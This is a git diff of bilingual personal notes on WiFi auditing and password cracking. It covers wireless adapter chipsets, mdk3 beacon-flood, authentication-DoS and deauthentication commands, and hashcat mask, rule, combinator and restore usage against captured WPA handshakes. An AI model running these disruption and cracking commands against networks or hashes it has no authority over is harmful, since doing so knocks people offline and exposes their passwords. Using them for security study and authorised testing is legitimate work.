 The mode 16801 expects a list of pre-computed PMKs, as hex encoded strings of length 64, as the input wordlist. To pre-compute the PMKss you can use the hcxkeys tool. The hcxkeys tools requre the ESSID, so you need to ask for the ESSID from your client in advance.???
 ![Cracking using Pre-computed PMKs](cracking_using_pre-computed_pmks.jpg)
@@ -413,7 +766,154 @@ pwhash|Generate hash of a word by using a given charset
     `wlangenpmkocl -e <essid> -i <wordlist> -a <pmklist>`
     or use mixed mode:
     `wlangenpmkocl -e <essid> -i <wordlist> <pmklist>`
+## [About the Wireless Card](https://www.aircrack-ng.org/doku.php?id=compatible_cards)
+Keep in mind your wireless card will need to support packet injection and monitoring mode.
+If you want to use hcxdumptool to caputure wlan traffic, please note that your WiFi adapter must support this. ‎Not all drivers support this. This is a list of chipsets, known as working "out of the box" on latest Linux kernels (>= 4.14)
+Supported and recommended cipsets:
+* USB ID 148f:7601 Ralink Technology, Corp. MT7601U Wireless Adapter
+* USB ID 148f:3070 Ralink Technology, Corp. RT2870/RT3070 Wireless Adapter
+* USB ID 148f:5370 Ralink Technology, Corp. RT5370 Wireless Adapter
+* USB ID 0bda:8187 Realtek Semiconductor Corp. RTL8187 Wireless Adapter
+* USB ID 0bda:8189 Realtek Semiconductor Corp. RTL8187B Wireless 802.11g 54Mbps Network Adapter
+To help other users to find a working adapter, please report your favourite adapters here:
+* TENDA W311U+ my favourite adapter
+* LOGILINK WL0151 my second favourite adapter
+* ALLNET ALL-WA0150N nice for portable operations
+* Alfa AWUS036H working, but too much power consumption
+* Alfa AWUS036NH working, but too much power consumption
+Please keep in mind:
+Some VENDORs change the chipset, but keep the same product name. Make sure, that a supported chipset is inside!
+### Introduction
+### Determine your requirements and constraints
+### Learn the basics of a wireless card
+### Determine the chipset
+### Verify the chipset capabilities
+### Determine the drivers and patches required
+[Determine the driver](https://www.aircrack-ng.org/doku.php?id=compatibility_drivers#drivers)
+### Select a card
+
+## mdk3 <a name=mkd3></a>
+### installation
+* 首先获取源代码
+
+            wget http://linux.gungoos.com/mdk3-v6.tar.gz
+            tar xvzf mdk3-v6.tar.gz
+            cd mdk3-v6
+  如果遇到这种错误,试试直接用Firefox访问那个地址下载吧。
+* 修改Makefile文件
+
+            sudo vim Makefile
+    将 “-lpthread” 替换成 “-pthread”。之后按ctrl + x -> Y (enter) -> enter
+* 编译
+
+        sudo make
+    这里make之后会刷出很多warnings，但并不影响编译。
+* 安装
+
+        sudo make install
+* 测试
+
+        sudo mdk3
+### use modes
+#### Beacon Flood Mode
+这个模式可以产生大量死亡SSID来充斥无线客户端的无线列表，从而扰乱无线使用者；我们甚至还可以自定义发送死亡SSID的BSSID和ESSID、加密方式（如wep/wpa2）等。
+
+        mdk3 mon0 b
+              -n <ssid>        #自定义ESSID
+              -f <filename>            #读取ESSID列表文件
+              -v <filename>           #自定义ESSID和BSSID对应列表文件
+              -d         #自定义为Ad-Hoc模式
+              -w         #自定义为wep模式
+              -g           #54Mbit模式
+              -t            # WPA TKIP encryption
+              -a           #WPA AES encryption
+              -m          #读取数据库的mac地址
+               -c <chan>                   #自定义信道
+               -s <pps>                #发包速率
+        mdk3 --help b  #查看详细内容
+##### Example 1
+`sudo mdk3 mon0 b -f wordlist1.txt -a -c 6 -s 80`
+
+./wordlist1.txt
+
+        burpS
+        WPSHAK
+##### Example 2
+固定FakeAP的MAC
+`sudo mdk3 mon0 b -v wordlist2.txt -a -c 6 -s 80`
+
+./wordlsit2.txt
+
+        AA:BB:CC:DD:AA:EE burpSuite
+        11:22:33:DD:AA:EE WPSHAK
+##### 效果说明
+PC可以容易看到 FakeAP，但是 Android 的 WLAN 扫描不容易看到，原因暂不明。
+#### Authentication Dos Mode
+##### 详细说明
+这是一种验证请求攻击模式：在这个模式里，软件自动模拟随机产生的mac向目标AP发起大量验证请求，可以导致AP忙于处理过多的请求而停止对正常连接客户端的响应；这个模式常见的使用是在 reaver 穷据路由 PIN 码，当遇到AP被“pin死”时，可以用这个模式来直接让AP停止正常响应，迫使AP主人重启路由。
+
+        mdk3 mon0 a
+              -a <ap_mac>              #测试指定BSSID
+              -m              #使用有效数据库中的客户端mac地址
+              -c          #对应 -a ，不检查是否测试成功
+              -i  <ap_mac>           #对指定BSSID进行智能攻击
+              -s <pps>               #速率，默认50
+##### Example 1
+`sudo mdk33 mon0 a -a EC:88:8F:A1:A5:90 -s 200`
+似乎无效
+手机连接AP正常上网
+#### Deauthentication/Disassociation Amok Mode
+##### 详细说明
+这个模式看名称就知道大概了：强制解除验证解除连接！在这个模式下，软件会向周围所有可见AP发起循环攻击……可以造成一定范围内的无线网络瘫痪（当然有白名单，黑名单模式），直到手动停止攻击。
+
+        mdk3 mon0 d
+              -w <filename>             #白名单mac地址列表文件
+              -b <filename>              #黑名单mac地址列表文件
+              -s <pps>                        #速率，这个模式下默认无限制
+              -c [chan,chan,chan,...]                  #信道，可以多填，如 2,4,5,1
+##### Example 1
+`sudo mdk3 d -s 120 -c 1,6,11`
+#### Basic probing and ESSID Bruteforce Mode
+##### 详细介绍
+基本探测AP信息和ESSID猜解模式
+
+        mdk3 mon0 p
+              -e <ssid>          #待检测的ssid
+              -f <filename>          #检测AP设置为隐藏的ssid列表文件
+              -t <bssid>               #用bssid检测AP的信息
+              -s <pps>                #速率，默认300
+              -b <character set>              #设置字符集
+
 ## [Hashcat 说明](https://klionsec.github.io/2017/04/26/use-hashcat-crack-hash/)
+### [New features in v5.0.0](https://hashcat.net/forum/thread-7903.html)
+#### Allow hashfile for -m 16800 to be used with -m 16801
+#### Slow candidates
+Hashcat has a new generic password candidate interface called "slow candidates".
+The first goal of this new interface is to allow attachment of advanced password candidate generators in the future (for example hashcat's table attack, kwprocessor, OMEN, PassGAN, PCFG, princeprocessor, etc.). At this time, the only attack modes that have been added are hashcat's straight attack (including rules engine), combinator attack, and mask attack (AKA brute-force with Markov optimizer). You can enable this new general password-candidate interface by using the new -S/--slow-candidates option.
+The second goal of the slow candidates engine is to generate password candidates on-host (on CPU). This is useful when attacking large hashlists with fast hashes (but many salts), or generally with slow hashes. Sometimes we cannot fully run large wordlists in combination with rules, because it simply takes too much time. But if we know of a useful pattern that works well with rules, we often want to use rules with a smaller, targeted wordlist instead, in order to exploit the pattern. On GPU, this creates a bottleneck in hashcat's architecture - because hashcat can only assign the words from the wordlist to the GPU compute units.
+A common workaround for this is to use a pipe, and feed hashcat to itself. But this traditional piping approach came at a cost - no ETA, no way to easily distribute chunks, etc. It was also completely incompatible with overlays like Hashtopolis. And if piping hashcat to itself isn't feasible for some reason, you quickly run into performance problems with small wordlists and large rulesets.
+To demonstrate this, here's an example where you have a very small wordlist with just a single word in the wordlist, but a huge ruleset to exploit some pattern:
+**Quote:**
+
+        $ wc -l wordlist.txt
+        1 wordlist.txt
+        $ wc -l pattern.rule
+        99092 pattern.rule
+
+Since the total number of candidates is ([number-of-words-from-wordlist] * [number-of-rules]), this attack should theoretically be enough to fully feed all GPU compute units. But in practice, hashcat works differently internally - mostly to deal with fast hashes. This makes the performance of such an attack terrible:
+**Quote:**
+
+        $ ./hashcat -m 400 example400.hash wordlist.txt -r pattern.rule --speed-only
+        ...
+        Speed.#2.........:      145 H/s (0.07ms)
+This is where slow candidates comes into play. To feed the GPU compute units more efficiently, hashcat applies rules on-host instead, creating a virtual wordlist in memory for fast access. But more importantly from hashcat's perspective, we now have a large wordlist, which allows hashcat to supply all GPU compute units with candidates. Since hashcat still needs to transfer the candidates over PCI-Express, this slows down cracking performance. In exchange, we get a large overall performance increase - multiple times higher, even considering the PCI-Express bottleneck - for both slow hashes and salted fast hashes with many salts,
+Here's the exact same attack, but using the new -S option to turn on slow candidates:
+**Quote:**
+
+        $ ./hashcat -m 400 example400.hash wordlist.txt -r pattern.rule --speed-only -S
+        ...
+        Speed.#2.........:   361.3 kH/s (3.54ms)
+#### The Hashcat brain
 ### need to be solved
   * install intel opencl sdk，速度太慢，查看hashcat硬件及驱动要求
       * Intel's OpenCL runtime (GPU only) is currently broken
@@ -428,12 +928,12 @@ pwhash|Generate hash of a word by using a given charset
 Intel CPUs require "OpenCL Runtime for Intel Core and Intel Xeon Processors" (16.1.1 or later)
 ##### how to install/reinstall
 1. Completely uninstall the current driver
- * Windows: use software center
- * Linux:
-   * NVIDIA: nvidia-uninstall
-   * AMD: amdconfig --uninstall=force
-   * If you installed the driver via a package manager (Linux), then you need to remove these packages too
-   * Make sure to purge those package, not to just uninstall them
+  * Windows: use software center
+  * Linux:
+    * NVIDIA: nvidia-uninstall
+    * AMD: amdconfig --uninstall=force
+    * If you installed the driver via a package manager (Linux), then you need to remove these packages too
+    * Make sure to purge those package, not to just uninstall them
 2. Reboot
 3. For Windows only: download and start Driver Fusion (free version is enough; select “Display”, AMD/NVidia/Intel, ignore the warning about Premium version), then Reboot
 4. Make sure that no Intel OpenCL SDK, AMD-APP-SDK or CUDA-SDK framework is installed – if it is installed, uninstall it!
@@ -514,6 +1014,37 @@ hash也叫哈希函数或散列函数，就是把你的原始密码拆散组合�
     * eHarmony-1.5M unsalted MD5
     * LinkedIn-6.5 unsalted SHA1
     * Gawker-1.3M unsalted DES
+#### An Introduction to Password Hashes
+Password hashes were created to solve a particularly tricky problem. If users must enter passwords to log in, you have to store those passwords on the system somehow. How do you store those passwords so that they're not plain text, yet when users enter their passwords, you can tell that they are correct? The solution is to encrypt passwords with a one-way hash. The idea behind a one-way hash is that it is relatively easy for input to get encrypted into the hash, but almost impossible to convert the hash back to the original input. If you've ever downloaded a Linux .iso and ran md5sum on it to make sure it matched the original, you were using a very popular one-way hashing algorithm, MD5. Other popular one-way hashes include the SHA family (SHA1, SHA256 and SHA512), and phpass is the modern default for PHP-based sites like WordPress.
+When you log in to a Linux system, the password you enter gets converted into a hash with the same algorithm originally used when you first set your password. The system compares this new hash with the hash it has stored on the system, and if they match, it assumes you entered the correct password and you are logged in. So for instance, on a modern PHP site, if your password was 123456, it might get stored as $P$BPlIiO5xdHmThnjjSyJ1jBICfPkpay1.
+#### How Password Cracking Works
+On a very basic level, password cracking works much like a regular login. You take a password guess, run it through a hashing algorithm and compare it to the existing hash. If it matches, you cracked the password. The main difference between cracking and a regular login is that you are doing hundreds of thousands if not millions of these comparisons a second.
+##### `/etc/passwd` and `/etc/shadow`
+The most important thing you need before you crack a password is the password hash. Because we are talking about perfectly legitimate uses of password cracking, this is simple. After all, you should have root access on your own systems or databases, and it should be easy to retrieve the password hashes. In the case of Linux logins, these password hashes used to be stored in /etc/passwd. That seems like a logical place to store passwords on a Linux system. The problem is, that file also stored the user names and user IDs in use on the system, and because of that, the file needs to be world-readable. Back when passwords were stored in that file, any local user could pull the full list of password hashes and start cracking. These days, Linux stores the password hashes in /etc/shadow, where they are readable only by root. In the case of Web site passwords, the hashes usually are stored either somewhere on the filesystem itself or often in a special user table in a database.
+The second important thing you need is to know what hashing algorithm was used for those hashes. Without that, you won't know what type of hashing algorithm to use for your attack. In the case of login hashes, the hash type is stored in the password hash itself. If you look at a password hash in /etc/shadow, you'll notice a log of strange characters along with a few $ thrown in. These $ characters delimit different sections of the hash as follows:
+`$id $salt $encrypted`
+The id section tells you what hash is being used:
+* 1 = MD5
+* 5 = SHA-256
+* 6 = SHA-512
+These days, you are most likely to run into SHA-256 and SHA-512 passwords. Because the hashing algorithm and the salt are stored along with the password itself, Linux password hashes are pretty portable. If you have one hash, you can copy it to another system and use the same password to log in.
+#### Why Use a GPU?
+The simple reason to use a GPU instead of a CPU for password cracking is that it's much faster. It turns out that cracking passwords is a lot like mining Bitcoins, so the same reasons GPUs are faster for Bitcoin mining apply to password cracking. The short answer is that there are many more specialized chips on a GPU that perform 32-bit operations really quickly. Although a CPU can perform a lot of general-purpose calculations, the chips on a GPU can perform specific types of operations much faster, and in a much more parallel way. If you want more specifics, this site explains in more detail from the perspective of Bitcoin mining: https://en.bitcoin.it/wiki/Why_a_GPU_mines_faster_than_a_CPU.
+#### The Hardware
+The most important piece of hardware you need to crack passwords is a fast GPU. Because cracking passwords is like mining Bitcoins, you can get a good idea of how your GPU would perform by how well it would mine Bitcoins.
+This site provides a good list of available video cards and describes their performance: https://en.bitcoin.it/wiki/Mining_hardware_comparison. When you look at that site, what you'll notice is that AMD GPUs tend to be much faster than NVIDIA GPUs, even though for gaming often the reverse is true. The reason for this is explained in detail in the explanation of why a GPU mines faster than a CPU, but in short, AMD GPUs tackle the problem of graphics rending with a lot of small, simple chips that perform 32-bit operations quickly. NVIDIA GPUs have fewer, but more sophisticated chips that are closer to a CPU in complexity. For the purposes of Bitcoin mining or password cracking, which can be highly parallel, those larger number of simple chips work the fastest. Also note that cracking software can take advantage of multiple GPUs, so if you can afford it, and your motherboard can support it, you may find you'll get the same performance out of two cheaper GPUs than a single expensive one.
+In my case, I didn't have a desktop PC lying around I could use for this, so I built a special desktop just for password cracking. In case you want to follow in my footsteps, here is my exact hardware along with prices:
+
+* GPU: SAPPHIRE FleX 100312FLEX Radeon HD 6950 2GB: $280
+* Power supply: RAIDMAX HYBRID 2 RX-730SS 730W: $60
+* Motherboard: ASUS M4A88T-V: $95
+* CPU: AMD Phenom II X6 1090T Black Edition Thuban 3.2GHz: $170
+* RAM: Corsair CMX4GX3M2B2000C9 4Gb 240-pin DDR3: $55
+* Storage: Seagate ST95005620AS 500GB 7200 RPM Hybrid Drive: $100
+* Case: already owned
+* Total: $760, $930 with monitor, $340 just GPU + PS
+If you already have a desktop that supports a modern video card, you may need to purchase only the GPU and power supply. Keep in mind that modern high-performance video cards require a lot of power, so you'll want at least a 700W power supply in your case, and more than that if you intend to chain two video cards together. I found that the AMD 6950 had good performance for my budget, plus this particular model can theoretically be turned into a 6970 with a firmware update. If you have a larger budget though, you may want to buy two or more 6950s and chain them together.
+So there you have it. You now have a month to get your hardware together, and next, I'll discuss the software side of password cracking, explain dictionary, brute-force and mask attacks, and give specific examples with my password-cracking system.
 ### requirements
 * AMD GPUs on Linux require "RadeonOpenCompute (ROCm)" Software Platform (1.6.180 or later)
 * AMD GPUs on Windows require "AMD Radeon Software Crimson Edition" (15.12 or later)
@@ -598,6 +1129,16 @@ run `hashcat -a 3 -m 11300 dash.hash test.hcmask -o cracked.txt --session test1`
 #### 自定义字符集规则
 * `-1 ?l?s ?1?1?1?1?1`: 表示五位由特殊字符和小写字母组成的密码
 * `-1 ?d?l -2 ?d?l?u -3 ?l?u ?1?2?3`: 表示密码的第一位可能是小写字母或者数字,第二位可能是大小写字母或者数字,第三位可能是大或小写字母
+#### Using custom-charset within hcmask file
+`charset1,charset2,chatset3,chatset4,mask`
+`?u,?u?l,?l?d,?1?2?2?2?2?3`
+Example:
+        
+        ?d?l,test?1?1?1
+        abcdef,0123,ABC,789,?3?3?3?3?1?1?1?1?2?2?4?4?4?4
+        company?d?d?d?d?d
+        ?l?l?l?l?d?d?d?d?d?d
+        ?u?l,?s?d,?1?a?a?a?a?2
 ### 不同破解模式下的具体应用场景,用的时候需要稍微注意下语句格式(暂以破解最普通的md5 hash为例)
 #### 基于纯字典的爆破模式 Straight:
 `hashcat --force -a 0 -m 0 hash.txt /home/weak_wordlist/pass/weakpass.txt -o res.txt`
@@ -613,38 +1154,48 @@ for multiple dictionaries in one folder:
 ![combination result](combination_res.png)
 ##### Combinator Attack
 ##### Description
-Each word of a dictionary is appended to each word in a dictionary.
-##### Input
-If our dictionary contains the words:
+Each word of the second dictionary is appended to each word in the first dictionary.
+##### Input and Output
 
+        G:\hashcat-4.2.0>cat dic1
+        admin
+        root
+        user
+        master
+        
+        G:\hashcat-4.2.0>cat dic2
         pass
-        12345
-        omg
-        Test
-##### Output
-Hashcat creates the following password candidates:
-
-        passpass
-        pass12345
-        passomg
-        passTest
-        12345pass
-        1234512345
-        12345omg
-        12345Test
-        omgpass
-        omg12345
-        omgomg
-        omgTest
-        Testpass
-        Test12345
-        Testomg
-        TestTest
+        toor
+        
+        G:\hashcat-4.2.0>hashcat64.exe -D 2 -a 1 dic1 dic2 --stdout
+        adminpass
+        admintoor
+        rootpass
+        roottoor
+        userpass
+        usertoor
+        masterpass
+        mastertoor
+        
+        G:\hashcat-4.2.0>hashcat64.exe -D 2 -a 1 dic2 dic1 --stdout
+        passadmin
+        passroot
+        passuser
+        passmaster
+        tooradmin
+        toorroot
+        tooruser
+        toormaster
+        
+        G:\hashcat-4.2.0>hashcat64.exe -D 2 -a 1 dic1 --stdout
+        Usage: hashcat64.exe [options]... hash|hashfile|hccapxfile [dictionary|mask|directory]...
+        
+        Try --help for more help.
 ##### Combinator Attack
 Using the Combinator Attack within hashcat (not standalone version of Combinator Attack).
 The command for the Combinator Attack in hashcat is `-a 1`
 You need to specify **exactly** 2 dictionaries in your command line: e.g.
-`./hashcat64.bin -m 0 -a 1 hash.txt dic1.exe dic2.txt`
+`./hashcat64.bin -m 0 -a 1 hash.txt dic1.txt dic2.txt`
 If you wish to add rules to either the left or right dictionary or both at once then you can use the `-j` or `-k` commands.
 `-j`, `--rule-left=RULE`        Single rule applied to each word on the left dictionary
 `-k`, `--rule-right=RULE`       Single rule applied to each word on the right dictionary
@@ -711,9 +1262,12 @@ root
 其实,它实际的拼接过程就相当于下面这样,直到最后就会撞到adminpass123
 `admin?1?1?1?1?d?d?d`
 `pass?1?1?1?1?d?d?d`
+
+`cudaHashcat64.exe --status -m 0 -a 6 -o cracked.txt hash.txt wordlist.lst masks\rockyou-7-2592000.hcmask`
 #### 下面是多字典实例
 `hashcat --force -m 0 hash.txt -a 6 dic1.txt dic2.txt -1 ?l ?l?1?1?1?d?d?d`
 ![hybrid wordlist + mask+muludic](hybrid wordlist + mask+muludic.png)
+(multiple dictionaries, not combined dictionaries)
 #### 基于掩码和字典配合的爆破模式 [Hybrid Mask + Wordlist]:
 `hashcat --force -m 0 hash.txt -1 ?l?d ?1?1?1?1 -a 7 dic1.txt dic2.txt`
 ![hybrid mask + wordlist](hybrid mask + wordlist.png)
@@ -852,7 +1406,160 @@ Let's suppose you want to make a rule which adds 3 digits after each words of yo
         $0 $1 $1
         and so on...
 As you can see, creating rules by hand could be very boring and time-consuming :p
-###### Using maskprocessor
+
+        $ cat append_days.rule
+        $0 $1
+        $0 $2
+        $0 $3
+        $0 $4
+        $0 $5
+        $0 $6
+        $0 $7
+        $0 $8
+        $0 $9
+        $1 $0
+        $1 $1
+        $1 $2
+        $1 $3
+        $1 $4
+        $1 $5
+        $1 $6
+        $1 $7
+        $1 $8
+        $1 $9
+        $2 $0
+        $2 $1
+        $2 $2
+        $2 $3
+        $2 $4
+        $2 $5
+        $2 $6
+        $2 $7
+        $2 $8
+        $2 $9
+        $3 $0
+        $3 $1
+
+        $ cat prefix_days.rule
+        ^0 ^1
+        ^0 ^2
+        ^0 ^3
+        ^0 ^4
+        ^0 ^5
+        ^0 ^6
+        ^0 ^7
+        ^0 ^8
+        ^0 ^9
+        ^1 ^0
+        ^1 ^1
+        ^1 ^2
+        ^1 ^3
+        ^1 ^4
+        ^1 ^5
+        ^1 ^6
+        ^1 ^7
+        ^1 ^8
+        ^1 ^9
+        ^2 ^0
+        ^2 ^1
+        ^2 ^2
+        ^2 ^3
+        ^2 ^4
+        ^2 ^5
+        ^2 ^6
+        ^2 ^7
+        ^2 ^8
+        ^2 ^9
+        ^3 ^0
+        ^3 ^1
+
+        $ cat append_months.rule
+        $0 $1
+        $0 $2
+        $0 $3
+        $0 $4
+        $0 $5
+        $0 $6
+        $0 $7
+        $0 $8
+        $0 $9
+        $1 $0
+        $1 $1
+        $1 $2
+
+        $ cat prefix_months.rule
+        ^0 ^1
+        ^0 ^2
+        ^0 ^3
+        ^0 ^4
+        ^0 ^5
+        ^0 ^6
+        ^0 ^7
+        ^0 ^8
+        ^0 ^9
+        ^1 ^0
+        ^1 ^1
+        ^1 ^2
+
+        $ cat append_single_days.rule
+        $1
+        $2
+        $3
+        $4
+        $5
+        $6
+        $7
+        $8
+        $9
+
+        $ cat prefix_single_days.rule
+        ^1
+        ^2
+        ^3
+        ^4
+        ^5
+        ^6
+        ^7
+        ^8
+        ^9
+
+        $ cat append_single_months.rule
+        $1
+        $2
+        $3
+        $4
+        $5
+        $6
+        $7
+        $8
+        $9
+
+        $ cat prefix_single_months.rule
+        ^1
+        ^2
+        ^3
+        ^4
+        ^5
+        ^6
+        ^7
+        ^8
+        ^9
+
+        $ hashcat64.exe -D 2 1.txt -r append_months.rule -r append_days.rule --stdout > months_days.txt
+        $ hashcat64.exe -D 2 1.txt -r append_single_months.rule -r append_single_days.rule --stdout >> months_days.txt
+        $ hashcat64.exe -D 2 1.txt -r append_months.rule -r append_single_days.rule --stdout >> months_days.txt
+        $ hashcat64.exe -D 2 1.txt -r append_single_months.rule -r append_days.rule --stdout >> months_days.txt
+
+        $ cat append_19years.rule
+        $4 $?d
+        $5 $?d
+        $6 $?d
+        $7 $?d
+        $8 $?d
+        $9 $?d
+Note: There is `-r` before each rule.
+###### [Using maskprocessor](https://hashcat.net/wiki/doku.php?id=maskprocessor)
+[Download](https://github.com/hashcat/maskprocessor/releases/)
 `$ ./map64.bin -o append_3_digits.rule '$?d $?d $?d'`
 maskprocessor allows you to easily and quickly generate rule files.
 Syntax:
@@ -873,7 +1580,18 @@ Here are some example commands to enable you to generate common rules locally on
         mp64.exe -1 0123456789 "d$?1$?1$?1" -o Double-Word-Suffix-0-999.rule
 * Paste them into a text file and name it "Hashcat Rule Generator.cmd".
 * Place this new file in the same directory as maskprocessor and double left click it.
+* Sometimes `mp64.bin` cannot work perfectly. It is because `$` should be escaped as `\$` in Ubuntu (no need to be escaped in Windows). And there is every one `\$` before one character.
+    * `./maskprocessor-0.73/mp64.bin -1 456789 -2 0123456789 "\$?1\$?2" -o append_19years.rule`
+        `J:\hashcat-5.0.0>hashcat64.exe -D 2 -a 0 1.txt -r append_19years.rule --stdout > 19years.txt`
+    * `./maskprocessor-0.73/mp64.bin -1 456789 -2 0123456789 "\$1\$9\$?1\$?2" -o append_19+years.rule`
+        `J:\hashcat-5.0.0>hashcat64.exe -D 2 -a 0 1.txt -r append_19+years.rule --stdout > 19+years.txt`
+    * `./maskprocessor-0.73/mp64.bin -1 01 -2 0123456789 "\$?1\$?2" -o append_20years.rule`
+        `J:\hashcat-5.0.0>hashcat64.exe -D 2 -a 0 1.txt -r append_20years.rule --stdout > 20years.txt`
+    * `./maskprocessor-0.73/mp64.bin -1 01 -2 0123456789 "\$2\$0\$?1\$?2" -o append_20+years.rule`
+        `J:\hashcat-5.0.0>hashcat64.exe -D 2 -a 0 1.txt -r append_20+years.rule --stdout > 20+years.txt`
+    * `cat *years*.txt > years.txt`
 You should very quickly be presented with a group of commonly used password modifications. Each rule file is individually named to help you understand its function.
+
 ###### Limitation
 On Windows, when trying to insert the `^` character, enclose it in quotes. `^` is an escape character in the Windows command shell, and will not be printed unless quoted.
 Example:
@@ -928,6 +1646,9 @@ Each rule of each rule-file is combined with each rule of each rule-file. This w
         hashcat1c
         hashcat2c
         hashcat3c
+
+        $ hashcat64.exe -D 2 -r l.rule J:\dictionaries\1\name_cn.txt --stdout > lname.txt
+        $ hashcat64.exr -D 2 -r c.rule J:\dictionaries\1\lname.txt --stdout > cname.txt
 Because the total number of generated rules is the product of all list, stacking multiple large lists can quickly exceed available memory. But a few well-chosen rules can be stacked to great effect.
 #### Using existing rule files
 
@@ -973,24 +1694,25 @@ The .restore file format is a custom format,specifically developed for hashcat. 
 It's important to know that the .restore file will be updated whenever this line is the status screen changes:
 `Restore.Point...:`
 ...and **not** whenever this line changes (hashcat needs to reach the next restore checkpoint):
-Progress......:
+`Progress......:`
 The second important thing to note is that quitting hashcat via the **Checkpoint stop** feature, by hitting 'c', will wait until the restore file has been updated to quit, whereas forcing hashcat to quit by hitting 'q' will not. By using 'q' instead of 'c' you run the risk of losing progress due to the restore file having not been recently updated.
 When pressing 'c', you will be prompted with "Check point enabled. Will quit at next restore-point update."
 The .restore file will be automatically deleted whenever the full cracking job was finished (exhausted) or whenever every hash within the hash list was cracked.
 To disable the restore support you can use `--restore-disable`. If you want to specify a different path to the restore file you can use `--restore-file-path`.???
 #### Restore howto
-Consider that you used this command lien to start a cracking job:
+Consider that you used this command line to start a cracking job:
 `hashcat -m 0 -a 3 --sessin session_name example0.hash masks/rockyou-7-2592000.hcmask`
 and you hit 'c' (or 'q' for quit) while it was running ( or it was stopped/killed for some other reasons).
 This command resumes the above cracking job:
 `hashcat --session session_name --restore`
-The `--restore` command does not need nor allow any further arguments except from `--session` (and `--restore` itself). You cannot simply ad or change some arguments when you restore the job. If you really insist to changes any arguments, you might be able to use some external tools (like analyze_hc_restore) at your own risk.
+The `--restore` command does not need nor allow any further arguments except from `--session` (and `--restore` itself). You cannot simply add or change some arguments when you restore the job. If you really insist to changes any arguments, you might be able to use some external tools (like analyze_hc_restore) at your own risk.
+`––session WPA2session1` – This gives your “session” a name in the event you want to pause and come back to where you left off. More about that in a little bit.
 #### Saving the restore file
 * Saving the restore file under a custom directory
     `hashcat64.exe -a 3 -m 2500  E:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx ?d?d?d?d?d?d?d?d --session test_session --restore-file-path E:\cap\test_session.restore`
     Without `--restore-file-path E:\cap\test_session.restore`, the .restore file will be saved under the current directory as <session_name>.restore.
 * Restore the process
-    `hashcat64.exe --session test_session --restore --restore_file-path E:\cap\test_session.restore`
+    `hashcat64.exe --session test_session --restore --restore-file-path E:\cap\test_session.restore`
     Without `--restore-file-path E:\cap\test_session.restore`, the restore process will search for <session_name>.restore file.
     The only parameters allowed when restoring a session are:
     * `--restore`(required): tell hashcat that it should restore a previous session.
@@ -1052,7 +1774,67 @@ Command line|Example|Description
 `--opencl-platforms`|`--opencl-platforms=2`|OpenCL platforms to use, separated with commas
 `-D`, `--opencl-device-types`|`-D 1`|OpenCL device-types to use, separated with commas
 `-d`, `--opencl-devices`|`-d 1`|OpenCL devices to use, separated with commas
+Note: Use `--force` with the command.
+### Benchmark
+`hashcat --benchmark`
+This will take a while as Hashcat can crack a wide variety of hash types. What benchmark does is it will simulate a quick session which each of the types of hash it can handle. After each session/hash type Hashcat will display the results in the terminal. Set your results aside for comparison when it’s done. In the meantime lets fire up the same thing on our EC2 instance.
+Keep in mind the following when comparing:
 
+* H/s == Hashes per second
+* KH/s == Kilohashes per second (Thousands of hashes per second)
+* MH/s == Megahashes per second (Millions of hashes per second)
+### [Utilities](https://hashcat.net/wiki/doku.php?id=hashcat_utils)
+[Download](https://github.com/hashcat/hashcat-utils/releases/tag/v1.9)
+#### cap2hccapx
+#### combinator
+
+        cdutboy@ubuntu:/mnt/hgfs/J/hashcat-5.0.0$ cat dic1
+        admin
+        root
+        user
+        master
+        cdutboy@ubuntu:/mnt/hgfs/J/hashcat-5.0.0$ cat dic2
+        pass
+        toor
+        cdutboy@ubuntu:/mnt/hgfs/J/hashcat-5.0.0$ ./hashcat-utils-1.9/bin/combinator.bin dic1 dic2
+        adminpass
+        admintoor
+        rootpass
+        roottoor
+        userpass
+        usertoor
+        masterpass
+        mastertoor
+
+Pipe to hashcat:
+
+        J:\hashcat-5.0.0>hashcat-utils-1.9\bin\combinator.exe dic1 dic2 | hashcat64.exe --force -d 3 -m 2500 -a 0 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx
+#### combinator3
+
+        cdutboy@ubuntu:/mnt/hgfs/J/hashcat-5.0.0$ cat dic1
+        admin
+        root
+        user
+        master
+        cdutboy@ubuntu:/mnt/hgfs/J/hashcat-5.0.0$ cat dic2
+        pass
+        toor
+        cdutboy@ubuntu:/mnt/hgfs/J/hashcat-5.0.0$ cat dic3
+        3
+        cdutboy@ubuntu:/mnt/hgfs/J/hashcat-5.0.0$ ./hashcat-utils-1.9/combinator3.bin dic1 dic2 dic3
+        bash: ./hashcat-utils-1.9/combinator3.bin: No such file or directory
+        cdutboy@ubuntu:/mnt/hgfs/J/hashcat-5.0.0$ ./hashcat-utils-1.9/bin/combinator3.bin dic1 dic2 dic3
+        adminpass3
+        admintoor3
+        rootpass3
+        roottoor3
+        userpass3
+        usertoor3
+        masterpass3
+        mastertoor3
+Pipe to hashcat:
+
+        J:\hashcat-5.0.0>hashcat-utils-1.9\bin\combinator3.exe dic1 dic2 dic3 | hashcat64.exe --force -d 3 -m 2500 -a 0 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx
 ## mdk3 <a name=mkd3></a>
 ### installation
 * 首先获取源代码
@@ -1144,15 +1926,36 @@ PC可以容易看到 FakeAP，但是 Android 的 WLAN 扫描不容易看到，�
               -t <bssid>               #用bssid检测AP的信息
               -s <pps>                #速率，默认300
               -b <character set>              #设置字符集
-#### How to get prepare for hashcat
-##### [Setting up p3.16xlarge for hashcat](https://medium.com/@iraklis/running-hashcat-v4-0-0-in-amazons-aws-new-p3-16xlarge-instance-e8fab4541e9b)
+## Building my own cracking box
+I could build my own cracking box and plenty of people have done that only run you a few thousand dollars. Roughly speaking to build a decent GPU based cracking box let's say it's going to cost you thousand dollars per box plus roughly five hundred dollars per GPU, really depends on what GPU you decide to purchase and there's different GPUs that crack passwords at different rates and it is not really what they're designed for cracking but they're designed for graphical intents purposes and it just so happens they work really well for cracking passwords.
+So if I was building my own box as I mentioned it cost me a few thousand dollars I mean really depends like a through 8 GPUs in it and increase the cost by four thousand dollars but it's only on perform about eight times faster than a machine with on GPU in it. To do this though I need a beefy power supply. These types of machines suck up a lot of power so I need really good cooling. The CPU and RAM are not very important for these types of purposes so so if you're building machine there's no real reason to max it out with the highest and CPU with multiple cores and a tremendous amount of RAM. And you probably if you're going to build a machine would probably want to put more than one GPU in it but but you could always start off with one GPU and if you need it to you could add additional GPUs as long as you have the right slots for doing that. 
